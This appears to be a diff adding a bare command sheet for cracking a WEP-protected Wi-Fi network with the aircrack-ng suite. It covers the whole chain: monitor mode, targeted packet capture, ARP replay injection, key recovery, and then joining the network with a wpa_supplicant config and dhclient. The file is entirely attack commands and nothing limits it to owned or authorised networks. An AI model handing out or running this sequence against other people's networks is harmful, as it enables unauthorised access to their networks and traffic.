@@ -1,0 +1,28 @@
+$ sudo airmon-ng start <wireless interface>
+
+
+$ sudo airodump-ng <wireless interface>
+
+
+$ sudo airodump-ng -c <channel> --bssid <BSSID> -w <output file> <wireless interface>
+
+
+$ sudo aireplay-ng -3 -b <BSSID> -h <your MAC address> <wireless interface>
+
+
+$ sudo aircrack-ng <output file>.cap
+
+
+nano wpa_supplicant.conf
+
+```
+network={
+    ssid="your_network_ssid"
+    key_mgmt=NONE
+    wep_key0="your_wep_key"
+    wep_tx_keyidx=0
+}
+
+```
+
+$ sudo dhclient <wireless interface>
